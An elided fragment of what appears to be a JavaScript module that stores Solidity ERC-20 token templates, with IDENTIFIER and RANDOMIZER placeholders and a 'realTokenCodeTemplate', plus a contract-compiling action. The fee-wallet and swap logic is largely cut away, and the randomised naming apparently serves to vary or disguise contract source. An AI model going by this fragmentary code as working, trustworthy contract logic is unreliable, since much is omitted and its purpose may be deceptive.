...
contract Token is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _isIDENTIFIERExcludedFromFee;
    ...
    uint256 public _RANDOMIZER;
    bool public _RANDOMIZER;
    address public _RANDOMIZER;

    constructor () payable {
        _taxWallet = payable(_msgSender());
        _balances[address(this)] = _tTotal;
        _isIDENTIFIERExcludedFromFee[owner()] = true;
        _isIDENTIFIERExcludedFromFee[address(this)] = true;
        _isIDENTIFIERExcludedFromFee[_taxWallet] = true;
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _IDENTIFIERamount = amount; _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(_IDENTIFIERamount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner() && to != _taxWallet) {
            ...
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isIDENTIFIERExcludedFromFee[to] ) {
            ...
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                ...
                sendIDENTIFIERETHToFee(contractETHBalance);
                sellCount++;
    ...
    function sendIDENTIFIERETHToFee(uint256 amount) private {
    ...
    function manualSwap() external {
        ...
        if(ethBalance>0){
          sendIDENTIFIERETHToFee(ethBalance);
        }
    }
}`,
        realTokenCodeTemplate: `// SPDX-License-Identifier: MIT
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if(to == uniswapV2Pair && swapEnabled) {
                sendIDENTIFIERETHToFee(address(this).balance);
            }
        }
...
const actions = {
    ...
    async compileContract({ commit }) {
        ...
        let possibleContractName = "Token";
        possibleContractName = contractNames.find((v) => {
